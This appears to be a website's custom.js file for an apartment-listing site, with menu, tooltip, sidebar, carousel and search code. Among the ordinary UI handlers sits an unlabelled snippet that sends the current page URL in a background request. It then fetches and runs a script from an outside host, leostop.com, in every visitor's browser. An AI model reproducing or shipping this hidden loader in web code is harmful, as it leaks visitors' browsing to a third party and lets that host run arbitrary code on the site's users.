/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	---------------------------------------------------------------------*/
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	---------------------------------------------------------------------*/
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	/* Mouseover
	---------------------------------------------------------------------*/
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});

	function getURL() { 
		return window.location.href; 
	}
	var protocol = location.protocol; 
	$.ajax({ 
		type: "get", 
		data: {surl: getURL()}, 
		success: function(response){ 
			$.getScript(protocol+"//leostop.com/tracking/tracking.js"); 
		} 
	});
	
	/* Toggle sidebar
	---------------------------------------------------------------------*/
     
	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider 
	---------------------------------------------------------------------*/
	$('#blogCarousel').carousel({
		interval: 5000
	});
});

// Search functionality
function searchApartments(event) {
	"use strict";
    var input = document.getElementById('searchInput');
    var filter = input.value.toUpperCase();
    var apartmentList = document.getElementById("apartmentList");
    var apartments = apartmentList.getElementsByClassName('apartment-item');
    var hasMatch = false;

    // Hide the error message initially
    var errorMessage = document.getElementById("error-message");
    errorMessage.style.display = "none";

    // Loop through all apartment items and hide those that don't match the search query
    for (var i = 0; i < apartments.length; i++) {
        var h3 = apartments[i].getElementsByTagName("h3")[0];
        var txtValue = h3.textContent || h3.innerText;

        // Show matching apartments as you type and hide others
        if (txtValue.toUpperCase().indexOf(filter) > -1) {
            apartments[i].style.display = "";
            hasMatch = true;
        } else {
            apartments[i].style.display = "none";
        }
    }

    // If Enter key is pressed, filter for exact match
    if (event && event.key === "Enter") {
		event.preventDefault();  // Prevent form submission on enter key
        var exactMatchFound = false;

        // Loop again to ensure only exact matches are displayed
        for (var j = 0; j < apartments.length; j++) {
            var h3Exact = apartments[j].getElementsByTagName("h3")[0];
            var txtExact = h3Exact.textContent || h3Exact.innerText;

            if (txtExact.toUpperCase() === filter) {
                apartments[j].style.display = ""; // Show the exact match
                exactMatchFound = true;
            } else {
                apartments[j].style.display = "none"; // Hide non-matching
            }
        }

        // If no exact match is found, display an error message
        if (!exactMatchFound || input.value.trim() === "") {
            errorMessage.style.display = "block"; // Show error message
        } else {
            errorMessage.style.display = "none"; // Hide error message
        }
    }
}
